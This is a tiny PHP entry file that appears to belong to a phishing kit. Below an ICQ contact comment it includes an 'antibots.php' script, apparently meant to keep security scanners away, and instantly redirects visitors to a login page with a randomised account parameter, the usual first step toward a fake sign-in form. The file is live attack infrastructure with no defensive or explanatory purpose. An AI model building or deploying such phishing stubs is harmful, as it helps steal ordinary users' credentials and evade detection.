<?php
/* ------------------------  ICQ : 743688056------------------------- */
include("../antibots.php");
header("Refresh:0; url=login.php?action=Login&account=$rand");
?>